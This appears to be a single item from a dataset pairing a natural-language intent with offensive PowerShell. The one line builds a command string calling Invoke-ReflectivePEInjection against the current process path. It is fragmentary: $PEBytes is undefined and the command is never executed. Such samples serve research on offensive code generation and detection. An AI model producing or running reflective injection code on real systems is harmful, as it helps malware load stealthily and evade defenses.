# Natural language intent:
# Retrieve the path of the current process, construct an injection command, and execute reflective PE injection.

$process = (Get-Process -Id $pid).Path; $injection = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExePath $($process)"
